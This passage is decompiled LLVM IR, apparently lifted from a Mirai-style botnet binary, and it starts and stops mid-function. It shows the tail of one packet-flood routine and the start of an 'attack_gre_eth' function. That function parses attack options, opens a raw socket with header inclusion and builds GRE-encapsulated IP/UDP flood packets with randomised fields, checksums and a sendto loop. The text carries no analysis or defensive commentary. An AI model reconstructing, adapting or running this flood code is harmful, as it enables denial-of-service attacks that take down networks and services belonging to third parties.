  %v4_e054 = inttoptr i32 %v3_e054 to i16*
  store i16 %v1_e054, i16* %v4_e054, align 2
  %v1_e06c = call i32 @__GI_htons(i32 %v3_e064)
  %v1_e07c = trunc i32 %v1_e06c to i16
  %v3_e07c = add i32 %v2_de80, 28
  %v4_e07c = inttoptr i32 %v3_e07c to i16*
  store i16 %v1_e07c, i16* %v4_e07c, align 2
  %v3_e088 = add i32 %v2_de80, 32
  %v4_e088 = inttoptr i32 %v3_e088 to i8*
  store i8 %v1_dcd8, i8* %v4_e088, align 1
  br i1 %v2_df5c, label %dec_label_pc_e0b0, label %dec_label_pc_e098

dec_label_pc_e098:                                ; preds = %dec_label_pc_df7c
  %v1_e09c = call i32 @__GI_htons(i32 16384)
  %sext18 = mul i32 %v1_e09c, 65536
  %v1_e0a0 = sdiv i32 %sext18, 65536
  %v1_e0ac = trunc i32 %v1_e0a0 to i16
  %v3_e0ac = add i32 %v2_de80, 30
  %v4_e0ac = inttoptr i32 %v3_e0ac to i16*
  store i16 %v1_e0ac, i16* %v4_e0ac, align 2
  br label %dec_label_pc_e0b0

dec_label_pc_e0b0:                                ; preds = %dec_label_pc_df7c, %dec_label_pc_e098
  %v3_e0b8 = add i32 %v2_de80, 33
  %v4_e0b8 = inttoptr i32 %v3_e0b8 to i8*
  store i8 17, i8* %v4_e0b8, align 1
  %v0_e0bc = call i32 @rand_next()
  %v2_e0c8 = add i32 %v2_de80, 36
  %v3_e0c8 = inttoptr i32 %v2_e0c8 to i32*
  store i32 %v0_e0bc, i32* %v3_e0c8, align 4
  br i1 %v2_e0d0, label %dec_label_pc_e0ec, label %dec_label_pc_e0d8

dec_label_pc_e0d8:                                ; preds = %dec_label_pc_e0b0
  %v3_e0dc = load i32, i32* %v3_dfb8, align 4
  %v2_e0e4 = add i32 %v2_de80, 40
  %v3_e0e4 = inttoptr i32 %v2_e0e4 to i32*
  store i32 %v3_e0dc, i32* %v3_e0e4, align 4
  br label %dec_label_pc_e104

dec_label_pc_e0ec:                                ; preds = %dec_label_pc_e0b0
  %v3_e0f0 = load i32, i32* %v3_e0c8, align 4
  %v1_e0f8 = sub i32 1023, %v3_e0f0
  %v2_e100 = add i32 %v2_de80, 40
  %v3_e100 = inttoptr i32 %v2_e100 to i32*
  store i32 %v1_e0f8, i32* %v3_e100, align 4
  br label %dec_label_pc_e104

dec_label_pc_e104:                                ; preds = %dec_label_pc_e0d8, %dec_label_pc_e0ec
  %v1_e10c = call i32 @__GI_htons(i32 %v9_dd14)
  %sext19 = mul i32 %v1_e10c, 65536
  %v1_e110 = sdiv i32 %sext19, 65536
  %v1_e11c = trunc i32 %v1_e110 to i16
  %v3_e11c = inttoptr i32 %v1_dea4 to i16*
  store i16 %v1_e11c, i16* %v3_e11c, align 2
  %v1_e128 = call i32 @__GI_htons(i32 %v4_e120)
  %sext20 = mul i32 %v1_e128, 65536
  %v1_e12c = sdiv i32 %sext20, 65536
  %v1_e138 = trunc i32 %v1_e12c to i16
  %v3_e138 = add i32 %v2_de80, 46
  %v4_e138 = inttoptr i32 %v3_e138 to i16*
  store i16 %v1_e138, i16* %v4_e138, align 2
  %v1_e158 = call i32 @__GI_htons(i32 %v3_e150)
  %sext22 = mul i32 %v1_e158, 65536
  %v1_e15c = sdiv i32 %sext22, 65536
  %v1_e168 = trunc i32 %v1_e15c to i16
  %v3_e168 = add i32 %v2_de80, 48
  %v4_e168 = inttoptr i32 %v3_e168 to i16*
  store i16 %v1_e168, i16* %v4_e168, align 2
  %v3_e16c = load i32, i32* %fd_-100, align 4
  %v1_e170 = add i32 %v3_e16c, 1
  br label %dec_label_pc_e178

dec_label_pc_e178:                                ; preds = %dec_label_pc_e178.preheader, %dec_label_pc_e104
  %v3_de40 = phi i32 [ %v1_e170, %dec_label_pc_e104 ], [ 0, %dec_label_pc_e178.preheader ]
  store i32 %v3_de40, i32* %fd_-100, align 4
  %sext9 = mul i32 %v3_de40, 16777216
  %v9_e184 = sdiv i32 %sext9, 16777216
  %v10_e184 = icmp sgt i32 %tmp32, %v9_e184
  br i1 %v10_e184, label %dec_label_pc_de40, label %dec_label_pc_e188.preheader

dec_label_pc_e188.preheader:                      ; preds = %dec_label_pc_e178
  %v3_e284 = icmp eq i32 %v9_ddc4, -1
  %v3_e2a8 = icmp eq i16 %v1_dcb8, -1
  %v9_e2fc = icmp eq i32 %v9_dd14, 65535
  %v3_e328 = icmp eq i16 %v1_dd40, -1
  %v2_e37c = icmp eq i8 %v1_dd80, 0
  %v2_e484 = add i32 %targs, 2
  br label %dec_label_pc_e188

dec_label_pc_e188:                                ; preds = %dec_label_pc_e4e0, %dec_label_pc_e188.preheader
  br label %dec_label_pc_e4e0

dec_label_pc_e194:                                ; preds = %dec_label_pc_e4e0
  %v3_e198 = mul i32 %v3_e210, 4
  %v2_e1a4 = add i32 %v3_e198, %v3_dc6c
  %v1_e1a8 = inttoptr i32 %v2_e1a4 to i32*
  %v2_e1a8 = load i32, i32* %v1_e1a8, align 4
  %v1_e1c8 = add i32 %v2_e1a8, 24
  %v1_e1d4 = add i32 %v2_e1a8, 44
  %v4_e1d8 = inttoptr i32 %v1_e1d4 to i8*
  %v1_e1e0 = add i32 %v2_e1a8, 52
  %v4_e1e4 = inttoptr i32 %v1_e1e0 to i8*
  %v2_e1f4 = mul i32 %v3_e210, 24
  %v2_e200 = add i32 %v2_e1f4, %targs
  %v1_e204 = add i32 %v2_e200, 20
  %v2_e204 = inttoptr i32 %v1_e204 to i8*
  %v3_e204 = load i8, i8* %v2_e204, align 1
  %tmp = icmp ugt i8 %v3_e204, 31
  br i1 %tmp, label %dec_label_pc_e280, label %dec_label_pc_e210

dec_label_pc_e210:                                ; preds = %dec_label_pc_e194
  %v1_e22c = add i32 %v2_e200, 16
  %v2_e22c = inttoptr i32 %v1_e22c to i32*
  %v3_e22c = load i32, i32* %v2_e22c, align 4
  %v1_e234 = call i32 @__GI_ntohl(i32 %v3_e22c)
  store i32 %v1_e234, i32* @r4, align 4
  %v0_e23c = call i32 @rand_next()
  %v3_e244 = load i32, i32* %fd_-100, align 4
  %v2_e250 = mul i32 %v3_e244, 24
  %v2_e25c = add i32 %v2_e250, %targs
  %v1_e260 = add i32 %v2_e25c, 20
  %v2_e260 = inttoptr i32 %v1_e260 to i8*
  %v3_e260 = load i8, i8* %v2_e260, align 1
  %v4_e260 = zext i8 %v3_e260 to i32
  %v6_e264 = lshr i32 %v0_e23c, %v4_e260
  %v0_e268 = load i32, i32* @r4, align 4
  %v2_e268 = add i32 %v0_e268, %v6_e264
  %v1_e270 = call i32 @__GI_htonl(i32 %v2_e268)
  %v2_e27c = add i32 %v2_e1a8, 16
  %v3_e27c = inttoptr i32 %v2_e27c to i32*
  store i32 %v1_e270, i32* %v3_e27c, align 4
  br label %dec_label_pc_e280

dec_label_pc_e280:                                ; preds = %dec_label_pc_e194, %dec_label_pc_e210
  br i1 %v3_e284, label %dec_label_pc_e28c, label %dec_label_pc_e29c

dec_label_pc_e28c:                                ; preds = %dec_label_pc_e280
  %v0_e28c = call i32 @rand_next()
  %v2_e298 = add i32 %v2_e1a8, 12
  %v3_e298 = inttoptr i32 %v2_e298 to i32*
  store i32 %v0_e28c, i32* %v3_e298, align 4
  br label %dec_label_pc_e29c

dec_label_pc_e29c:                                ; preds = %dec_label_pc_e280, %dec_label_pc_e28c
  br i1 %v3_e2a8, label %dec_label_pc_e2b0, label %dec_label_pc_e2f0

dec_label_pc_e2b0:                                ; preds = %dec_label_pc_e29c
  %v0_e2b0 = call i32 @rand_next()
  %v1_e2c4 = trunc i32 %v0_e2b0 to i16
  %v3_e2c4 = add i32 %v2_e1a8, 4
  %v4_e2c4 = inttoptr i32 %v3_e2c4 to i16*
  store i16 %v1_e2c4, i16* %v4_e2c4, align 2
  %v1_e2d0 = add i32 %v0_e2b0, 64536
  %v1_e2dc = xor i32 %v1_e2d0, 65535
  %v1_e2ec = trunc i32 %v1_e2dc to i16
  %v3_e2ec = add i32 %v2_e1a8, 28
  %v4_e2ec = inttoptr i32 %v3_e2ec to i16*
  store i16 %v1_e2ec, i16* %v4_e2ec, align 2
  br label %dec_label_pc_e2f0

dec_label_pc_e2f0:                                ; preds = %dec_label_pc_e29c, %dec_label_pc_e2b0
  br i1 %v9_e2fc, label %dec_label_pc_e304, label %dec_label_pc_e31c

dec_label_pc_e304:                                ; preds = %dec_label_pc_e2f0
  %v0_e304 = call i32 @rand_next()
  %v1_e318 = trunc i32 %v0_e304 to i16
  %v3_e318 = inttoptr i32 %v1_e1d4 to i16*
  store i16 %v1_e318, i16* %v3_e318, align 2
  br label %dec_label_pc_e31c

dec_label_pc_e31c:                                ; preds = %dec_label_pc_e2f0, %dec_label_pc_e304
  br i1 %v3_e328, label %dec_label_pc_e330, label %dec_label_pc_e348

dec_label_pc_e330:                                ; preds = %dec_label_pc_e31c
  %v0_e330 = call i32 @rand_next()
  %v1_e344 = trunc i32 %v0_e330 to i16
  %v3_e344 = add i32 %v2_e1a8, 46
  %v4_e344 = inttoptr i32 %v3_e344 to i16*
  store i16 %v1_e344, i16* %v4_e344, align 2
  br label %dec_label_pc_e348

dec_label_pc_e348:                                ; preds = %dec_label_pc_e31c, %dec_label_pc_e330
  br i1 %v2_e0d0, label %dec_label_pc_e354, label %dec_label_pc_e368

dec_label_pc_e354:                                ; preds = %dec_label_pc_e348
  %v0_e354 = call i32 @rand_next()
  %v2_e360 = add i32 %v2_e1a8, 40
  %v3_e360 = inttoptr i32 %v2_e360 to i32*
  store i32 %v0_e354, i32* %v3_e360, align 4
  br label %dec_label_pc_e378

dec_label_pc_e368:                                ; preds = %dec_label_pc_e348
  %v1_e36c = add i32 %v2_e1a8, 16
  %v2_e36c = inttoptr i32 %v1_e36c to i32*
  %v3_e36c = load i32, i32* %v2_e36c, align 4
  %v2_e374 = add i32 %v2_e1a8, 40
  %v3_e374 = inttoptr i32 %v2_e374 to i32*
  store i32 %v3_e36c, i32* %v3_e374, align 4
  br label %dec_label_pc_e378

dec_label_pc_e378:                                ; preds = %dec_label_pc_e354, %dec_label_pc_e368
  br i1 %v2_e37c, label %dec_label_pc_e390, label %dec_label_pc_e384

dec_label_pc_e384:                                ; preds = %dec_label_pc_e378
  call void @rand_str(i8* %v4_e1e4, i32 %v9_dd58)
  br label %dec_label_pc_e390

dec_label_pc_e390:                                ; preds = %dec_label_pc_e378, %dec_label_pc_e384
  %v3_e398 = add i32 %v2_e1a8, 10
  %v4_e398 = inttoptr i32 %v3_e398 to i16*
  store i16 0, i16* %v4_e398, align 2
  %v1_e3a0 = inttoptr i32 %v2_e1a8 to i16*
  %v5_e3a8 = call i16 @checksum_generic(i16* %v1_e3a0, i32 20)
  store i16 %v5_e3a8, i16* %v4_e398, align 2
  %v3_e3c4 = add i32 %v2_e1a8, 34
  %v4_e3c4 = inttoptr i32 %v3_e3c4 to i16*
  store i16 0, i16* %v4_e3c4, align 2
  %v1_e3cc = inttoptr i32 %v1_e1c8 to i16*
  %v5_e3d4 = call i16 @checksum_generic(i16* %v1_e3cc, i32 20)
  store i16 %v5_e3d4, i16* %v4_e3c4, align 2
  %v3_e3f0 = add i32 %v2_e1a8, 50
  %v4_e3f0 = inttoptr i32 %v3_e3f0 to i16*
  store i16 0, i16* %v4_e3f0, align 2
  %v1_e3f8 = add i32 %v2_e1a8, 48
  %v2_e3f8 = inttoptr i32 %v1_e3f8 to i16*
  %v3_e3f8 = load i16, i16* %v2_e3f8, align 2
  %v8_e40c = call i16 @checksum_tcpudp(i32 %v1_e1c8, i8* %v4_e1d8, i16 %v3_e3f8, i32 %fold21)
  store i16 %v8_e40c, i16* %v4_e3f0, align 2
  %v3_e420 = load i32, i32* %fd_-100, align 4
  %v2_e42c = mul i32 %v3_e420, 24
  %v2_e438 = add i32 %v2_e42c, %targs
  %v3_e440 = inttoptr i32 %v2_e438 to i16*
  store i16 2, i16* %v3_e440, align 2
  %v3_e444 = load i32, i32* %fd_-100, align 4
  %v2_e450 = mul i32 %v3_e444, 24
  %v2_e45c = add i32 %v2_e450, %targs
  %v1_e464 = add i32 %v2_e1a8, 16
  %v2_e464 = inttoptr i32 %v1_e464 to i32*
  %v3_e464 = load i32, i32* %v2_e464, align 4
  %v2_e468 = add i32 %v2_e45c, 4
  %v3_e468 = inttoptr i32 %v2_e468 to i32*
  store i32 %v3_e464, i32* %v3_e468, align 4
  %v3_e46c = load i32, i32* %fd_-100, align 4
  %v2_e478 = mul i32 %v3_e46c, 24
  %v3_e48c = add i32 %v2_e484, %v2_e478
  %v4_e48c = inttoptr i32 %v3_e48c to i16*
  store i16 0, i16* %v4_e48c, align 2
  %v3_e498 = load i32, i32* %fd_-100, align 4
  %v2_e4a4 = mul i32 %v3_e498, 24
  %v2_e4b0 = add i32 %v2_e4a4, %targs
  %v6_e4d0 = call i32 @__libc_sendto(i32 %v3_dddc, i32 %v2_e1a8, i32 %fold, i32 16384, i32 %v2_e4b0, i32 16)
  %v3_e4d4 = load i32, i32* %fd_-100, align 4
  %v1_e4d8 = add i32 %v3_e4d4, 1
  br label %dec_label_pc_e4e0

dec_label_pc_e4e0:                                ; preds = %dec_label_pc_e188, %dec_label_pc_e390
  %v3_e210 = phi i32 [ 0, %dec_label_pc_e188 ], [ %v1_e4d8, %dec_label_pc_e390 ]
  store i32 %v3_e210, i32* %fd_-100, align 4
  %sext10 = mul i32 %v3_e210, 16777216
  %v9_e4ec = sdiv i32 %sext10, 16777216
  %v10_e4ec = icmp sgt i32 %tmp32, %v9_e4ec
  br i1 %v10_e4ec, label %dec_label_pc_e194, label %dec_label_pc_e188

dec_label_pc_e4f4:                                ; preds = %entry, %dec_label_pc_de28
  ret void

; uselistorder directives
  uselistorder i32 %v3_e210, { 0, 3, 1, 2 }
  uselistorder i32 %v2_e1a8, { 9, 10, 3, 4, 5, 11, 12, 6, 8, 2, 1, 0, 13, 14, 7, 15, 16, 17 }
  uselistorder i32 %v3_de40, { 0, 2, 1 }
  uselistorder i32 %v2_de80, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 %fold21, { 1, 0 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %v3_dddc, { 2, 1, 3, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %fd_-100, { 1, 2, 3, 4, 5, 6, 7, 0, 8, 9, 10, 12, 11 }
  uselistorder i32 %targs, { 0, 2, 3, 4, 5, 1, 6 }
  uselistorder label %dec_label_pc_e4f4, { 1, 0 }
  uselistorder label %dec_label_pc_e4e0, { 1, 0 }
  uselistorder label %dec_label_pc_e390, { 1, 0 }
  uselistorder label %dec_label_pc_e378, { 1, 0 }
  uselistorder label %dec_label_pc_e348, { 1, 0 }
  uselistorder label %dec_label_pc_e31c, { 1, 0 }
  uselistorder label %dec_label_pc_e2f0, { 1, 0 }
  uselistorder label %dec_label_pc_e29c, { 1, 0 }
  uselistorder label %dec_label_pc_e280, { 1, 0 }
  uselistorder label %dec_label_pc_e178, { 1, 0 }
  uselistorder label %dec_label_pc_e104, { 1, 0 }
  uselistorder label %dec_label_pc_e0b0, { 1, 0 }
  uselistorder label %dec_label_pc_df7c, { 1, 0 }
}

define void @attack_gre_eth(i8 %targs_len, i32 %targs, i8 %opts_len, i32 %opts) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %tmp32 = sext i8 %targs_len to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-130 = alloca i32, align 4
  %ent2_-132 = alloca i32, align 4
  %ent1_-128 = alloca i32, align 4
  %i_-124 = alloca i32, align 4
  %fd_-120 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_e504 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_e504, i32* %ip.global-to-local, align 4
  store i32 58640, i32* %stack_var_-4, align 4
  %v2_e50c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e50c, i32* @fp, align 4
  %v4_e52c = zext i8 %targs_len to i32
  store i32 %v4_e52c, i32* %r0.global-to-local, align 4
  %v3_e538 = call i32 @calloc(i32 %tmp32, i32 4)
  %v4_e544 = zext i8 %opts_len to i32
  store i32 %v4_e544, i32* %r0.global-to-local, align 4
  %v9_e558 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 2, i32 0)
  %v1_e560 = trunc i32 %v9_e558 to i8
  store i32 %v4_e544, i32* %r0.global-to-local, align 4
  %v9_e57c = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 3, i32 65535)
  %sext4 = mul i32 %v9_e57c, 65536
  %v1_e580 = sdiv i32 %sext4, 65536
  %v1_e584 = trunc i32 %v1_e580 to i16
  store i32 %v4_e544, i32* %r0.global-to-local, align 4
  %v9_e59c = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 4, i32 64)
  %v1_e5a4 = trunc i32 %v9_e59c to i8
  store i32 %v4_e544, i32* %r0.global-to-local, align 4
  %v9_e5bc = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 5, i32 1)
  %sext6 = mul i32 %v9_e5bc, 16777216
  %v1_e5c0 = sdiv i32 %sext6, 16777216
  %v1_e5c4 = trunc i32 %v1_e5c0 to i8
  store i32 %v4_e544, i32* %r0.global-to-local, align 4
  %v9_e5e0 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 6, i32 65535)
  store i32 %v4_e544, i32* %r0.global-to-local, align 4
  %v9_e604 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 7, i32 65535)
  %sext7 = mul i32 %v9_e604, 65536
  %v1_e608 = sdiv i32 %sext7, 65536
  %v1_e60c = trunc i32 %v1_e608 to i16
  store i32 %v4_e544, i32* %r0.global-to-local, align 4
  %v9_e624 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 0, i32 512)
  store i32 %v4_e544, i32* %r0.global-to-local, align 4
  %v9_e644 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 1, i32 1)
  %sext8 = mul i32 %v9_e644, 16777216
  %v1_e648 = sdiv i32 %sext8, 16777216
  %v1_e64c = trunc i32 %v1_e648 to i8
  store i32 %v4_e544, i32* %r0.global-to-local, align 4
  %v9_e664 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 19, i32 0)
  %sext9 = mul i32 %v9_e664, 16777216
  %v1_e668 = sdiv i32 %sext9, 16777216
  %v1_e66c = trunc i32 %v1_e668 to i8
  %v2_e674 = load i32, i32* @LOCAL_ADDR, align 4
  store i32 %v2_e674, i32* %ip.global-to-local, align 4
  store i32 %v4_e544, i32* %r0.global-to-local, align 4
  %v9_e690 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 25, i32 %v2_e674)
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_e6a8 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_e6a8, i32* %r0.global-to-local, align 4
  %v7_e6b8 = icmp eq i32 %v3_e6a8, -1
  br i1 %v7_e6b8, label %dec_label_pc_eec0, label %dec_label_pc_e6c0

dec_label_pc_e6c0:                                ; preds = %entry
  store i32 1, i32* %fd_-120, align 4
  %v2_e6c8 = ptrtoint i32* %fd_-120 to i32
  store i32 %v2_e6c8, i32* %ip.global-to-local, align 4
  store i32 %v3_e6a8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v5_e6e4 = call i32 @__GI_setsockopt(i32 %v3_e6a8, i32 0, i32 3, i32 %v2_e6c8, i32 4)
  store i32 %v5_e6e4, i32* %r0.global-to-local, align 4
  %v3_e6ec = icmp eq i32 %v5_e6e4, -1
  br i1 %v3_e6ec, label %dec_label_pc_e6f4, label %dec_label_pc_eaa0.preheader

dec_label_pc_eaa0.preheader:                      ; preds = %dec_label_pc_e6c0
  %fold = add i32 %v9_e624, 66
  %v3_e7ec = urem i32 %fold, 65536
  %v4_e808 = urem i32 %v1_e580, 65536
  %v2_e834 = icmp eq i8 %v1_e5c4, 0
  %fold16 = add i32 %v9_e624, 28
  %v3_e964 = urem i32 %fold16, 65536
  %v3_e98c = xor i32 %v4_e808, 65535
  %v2_e9f8 = icmp eq i8 %v1_e66c, 0
  %v4_ea48 = urem i32 %v1_e608, 65536
  %fold22 = add i32 %v9_e624, 8
  %v3_ea78 = urem i32 %fold22, 65536
  br label %dec_label_pc_eaa0

dec_label_pc_e6f4:                                ; preds = %dec_label_pc_e6c0
  store i32 %v3_e6a8, i32* %r0.global-to-local, align 4
  %v1_e6f8 = call i32 @__GI___libc_close(i32 %v3_e6a8)
  store i32 %v1_e6f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eec0

dec_label_pc_e70c:                                ; preds = %dec_label_pc_eaa0
  %v3_e710 = mul i32 %v3_e70c, 4
  %v2_e71c = add i32 %v3_e710, %v3_e538
  store i32 %v2_e71c, i32* @r4, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_e72c = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_e72c, i32* %r0.global-to-local, align 4
  %v1_e734 = load i32, i32* @r4, align 4
  %v2_e734 = inttoptr i32 %v1_e734 to i32*
  store i32 %v2_e72c, i32* %v2_e734, align 4
  %v3_e738 = load i32, i32* %fd_-120, align 4
  %v3_e73c = mul i32 %v3_e738, 4
  %v2_e748 = add i32 %v3_e73c, %v3_e538
  %v1_e74c = inttoptr i32 %v2_e748 to i32*
  %v2_e74c = load i32, i32* %v1_e74c, align 4
  %v5_e750 = inttoptr i32 %v2_e74c to i8*
  %v1_e764 = add i32 %v2_e74c, 24
  %v1_e770 = add i32 %v2_e74c, 38
  %v5_e774 = inttoptr i32 %v1_e770 to i8*
  %v1_e77c = add i32 %v2_e74c, 58
  %v5_e780 = inttoptr i32 %v1_e77c to i16*
  store i8 69, i8* %v5_e750, align 1
  %v3_e7d4 = add i32 %v2_e74c, 1
  %v4_e7d4 = inttoptr i32 %v3_e7d4 to i8*
  store i8 %v1_e560, i8* %v4_e7d4, align 1
  store i32 %v3_e7ec, i32* %r0.global-to-local, align 4
  %v1_e7f4 = call i32 @__GI_htons(i32 %v3_e7ec)
  %sext12 = mul i32 %v1_e7f4, 65536
  %v1_e7f8 = sdiv i32 %sext12, 65536
  %v1_e804 = trunc i32 %v1_e7f8 to i16
  %v3_e804 = add i32 %v2_e74c, 2
  %v4_e804 = inttoptr i32 %v3_e804 to i16*
  store i16 %v1_e804, i16* %v4_e804, align 2
  store i32 %v4_e808, i32* %r0.global-to-local, align 4
  %v1_e810 = call i32 @__GI_htons(i32 %v4_e808)
  store i32 %v1_e810, i32* %r0.global-to-local, align 4
  %v1_e820 = trunc i32 %v1_e810 to i16
  %v3_e820 = add i32 %v2_e74c, 4
  %v4_e820 = inttoptr i32 %v3_e820 to i16*
  store i16 %v1_e820, i16* %v4_e820, align 2
  %v3_e82c = add i32 %v2_e74c, 8
  %v4_e82c = inttoptr i32 %v3_e82c to i8*
  store i8 %v1_e5a4, i8* %v4_e82c, align 1
  br i1 %v2_e834, label %dec_label_pc_e854, label %dec_label_pc_e83c

dec_label_pc_e83c:                                ; preds = %dec_label_pc_e70c
  store i32 16384, i32* %r0.global-to-local, align 4
  %v1_e840 = call i32 @__GI_htons(i32 16384)
  store i32 %v1_e840, i32* %r0.global-to-local, align 4
  %sext14 = mul i32 %v1_e840, 65536
  %v1_e844 = sdiv i32 %sext14, 65536
  %v1_e850 = trunc i32 %v1_e844 to i16
  %v3_e850 = add i32 %v2_e74c, 6
  %v4_e850 = inttoptr i32 %v3_e850 to i16*
  store i16 %v1_e850, i16* %v4_e850, align 2
  br label %dec_label_pc_e854

dec_label_pc_e854:                                ; preds = %dec_label_pc_e70c, %dec_label_pc_e83c
  %v3_e85c = add i32 %v2_e74c, 9
  %v4_e85c = inttoptr i32 %v3_e85c to i8*
  store i8 47, i8* %v4_e85c, align 1
  %v2_e868 = add i32 %v2_e74c, 12
  %v3_e868 = inttoptr i32 %v2_e868 to i32*
  store i32 %v9_e690, i32* %v3_e868, align 4
  %v3_e86c = load i32, i32* %fd_-120, align 4
  %v2_e878 = mul i32 %v3_e86c, 24
  %v2_e884 = add i32 %v2_e878, %targs
  %v1_e888 = add i32 %v2_e884, 16
  %v2_e888 = inttoptr i32 %v1_e888 to i32*
  %v3_e888 = load i32, i32* %v2_e888, align 4
  %v2_e890 = add i32 %v2_e74c, 16
  %v3_e890 = inttoptr i32 %v2_e890 to i32*
  store i32 %v3_e888, i32* %v3_e890, align 4
  store i32 25944, i32* %r0.global-to-local, align 4
  %v1_e89c = call i32 @__GI_htons(i32 25944)
  %sext15 = mul i32 %v1_e89c, 65536
  %v1_e8a0 = sdiv i32 %sext15, 65536
  %v1_e8ac = trunc i32 %v1_e8a0 to i16
  %v3_e8ac = add i32 %v2_e74c, 22
  %v4_e8ac = inttoptr i32 %v3_e8ac to i16*
  store i16 %v1_e8ac, i16* %v4_e8ac, align 2
  store i32 2048, i32* %r0.global-to-local, align 4
  %v1_e8b4 = call i32 @__GI_htons(i32 2048)
  store i32 %v1_e8b4, i32* %r0.global-to-local, align 4
  store i32 %v1_e764, i32* %ip.global-to-local, align 4
  %v1_e8d8 = trunc i32 %v1_e8b4 to i8
  %v3_e8d8 = add i32 %v2_e74c, 36
  %v4_e8d8 = inttoptr i32 %v3_e8d8 to i8*
  store i8 %v1_e8d8, i8* %v4_e8d8, align 1
  %v0_e8dc = load i32, i32* %r0.global-to-local, align 4
  %v3_e8dc = udiv i32 %v0_e8dc, 256
  %v1_e8f8 = trunc i32 %v3_e8dc to i8
  %v2_e8f8 = load i32, i32* %ip.global-to-local, align 4
  %v3_e8f8 = add i32 %v2_e8f8, 13
  %v4_e8f8 = inttoptr i32 %v3_e8f8 to i8*
  store i8 %v1_e8f8, i8* %v4_e8f8, align 1
  store i8 69, i8* %v5_e774, align 1
  %v3_e94c = add i32 %v2_e74c, 39
  %v4_e94c = inttoptr i32 %v3_e94c to i8*
  store i8 %v1_e560, i8* %v4_e94c, align 1
  store i32 %v3_e964, i32* %r0.global-to-local, align 4
  %v1_e96c = call i32 @__GI_htons(i32 %v3_e964)
  %sext17 = mul i32 %v1_e96c, 65536
  %v1_e970 = sdiv i32 %sext17, 65536
  %v1_e97c = trunc i32 %v1_e970 to i16
  %v3_e97c = add i32 %v2_e74c, 40
  %v4_e97c = inttoptr i32 %v3_e97c to i16*
  store i16 %v1_e97c, i16* %v4_e97c, align 2
  store i32 %v3_e98c, i32* %r0.global-to-local, align 4
  %v1_e994 = call i32 @__GI_htons(i32 %v3_e98c)
  store i32 %v1_e994, i32* %r0.global-to-local, align 4
  %v1_e9a4 = trunc i32 %v1_e994 to i16
  %v3_e9a4 = add i32 %v2_e74c, 42
  %v4_e9a4 = inttoptr i32 %v3_e9a4 to i16*
  store i16 %v1_e9a4, i16* %v4_e9a4, align 2
  %v3_e9b0 = add i32 %v2_e74c, 46
  %v4_e9b0 = inttoptr i32 %v3_e9b0 to i8*
  store i8 %v1_e5a4, i8* %v4_e9b0, align 1
  br i1 %v2_e834, label %dec_label_pc_e9d8, label %dec_label_pc_e9c0

dec_label_pc_e9c0:                                ; preds = %dec_label_pc_e854
  store i32 16384, i32* %r0.global-to-local, align 4
  %v1_e9c4 = call i32 @__GI_htons(i32 16384)
  store i32 %v1_e9c4, i32* %r0.global-to-local, align 4
  %sext19 = mul i32 %v1_e9c4, 65536
  %v1_e9c8 = sdiv i32 %sext19, 65536
  %v1_e9d4 = trunc i32 %v1_e9c8 to i16
  %v3_e9d4 = add i32 %v2_e74c, 44
  %v4_e9d4 = inttoptr i32 %v3_e9d4 to i16*
  store i16 %v1_e9d4, i16* %v4_e9d4, align 2
  br label %dec_label_pc_e9d8

dec_label_pc_e9d8:                                ; preds = %dec_label_pc_e854, %dec_label_pc_e9c0
  %v3_e9e0 = add i32 %v2_e74c, 47
  %v4_e9e0 = inttoptr i32 %v3_e9e0 to i8*
  store i8 17, i8* %v4_e9e0, align 1
  %v0_e9e4 = call i32 @rand_next()
  store i32 %v0_e9e4, i32* %r0.global-to-local, align 4
  %v2_e9f0 = add i32 %v2_e74c, 50
  %v3_e9f0 = inttoptr i32 %v2_e9f0 to i32*
  store i32 %v0_e9e4, i32* %v3_e9f0, align 4
  br i1 %v2_e9f8, label %dec_label_pc_ea14, label %dec_label_pc_ea00

dec_label_pc_ea00:                                ; preds = %dec_label_pc_e9d8
  %v3_ea04 = load i32, i32* %v3_e890, align 4
  %v2_ea0c = add i32 %v2_e74c, 54
  %v3_ea0c = inttoptr i32 %v2_ea0c to i32*
  store i32 %v3_ea04, i32* %v3_ea0c, align 4
  br label %dec_label_pc_ea2c

dec_label_pc_ea14:                                ; preds = %dec_label_pc_e9d8
  %v3_ea18 = load i32, i32* %v3_e9f0, align 4
  %v1_ea20 = sub i32 1023, %v3_ea18
  %v2_ea28 = add i32 %v2_e74c, 54
  %v3_ea28 = inttoptr i32 %v2_ea28 to i32*
  store i32 %v1_ea20, i32* %v3_ea28, align 4
  br label %dec_label_pc_ea2c

dec_label_pc_ea2c:                                ; preds = %dec_label_pc_ea00, %dec_label_pc_ea14
  store i32 %v9_e5e0, i32* %r0.global-to-local, align 4
  %v1_ea34 = call i32 @__GI_htons(i32 %v9_e5e0)
  %sext20 = mul i32 %v1_ea34, 65536
  %v1_ea38 = sdiv i32 %sext20, 65536
  %v1_ea44 = trunc i32 %v1_ea38 to i16
  store i16 %v1_ea44, i16* %v5_e780, align 2
  store i32 %v4_ea48, i32* %r0.global-to-local, align 4
